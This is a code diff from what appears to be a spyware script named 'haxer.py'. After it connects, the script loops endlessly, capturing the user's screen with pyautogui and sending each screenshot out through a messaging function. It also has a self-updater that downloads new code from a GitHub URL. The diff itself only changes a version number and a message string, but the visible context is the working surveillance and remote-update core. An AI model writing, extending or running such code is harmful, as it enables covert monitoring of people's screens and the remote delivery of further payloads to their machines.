@@ -1,4 +1,4 @@
-V=0.02
+V=0.001
 import requests, time, pyautogui, datetime, io, inspect, os
 from bs4 import BeautifulSoup
 
@@ -19,7 +19,7 @@ sendMsg("Successfully connected!")
 while True:
   # Send Data
   screenshot = pyautogui.screenshot()
-  sendMsg(f"# Update at {str(datetime.datetime.now())}\nHallo\nScreenshot:", screenshot)
+  sendMsg(f"# Update at {str(datetime.datetime.now())}\nScreenshot:", screenshot)
 
   # Self-Updater
   r = requests.get("https://github.com/kiwuthegamer/Metamorphic/blob/main/haxer.py")
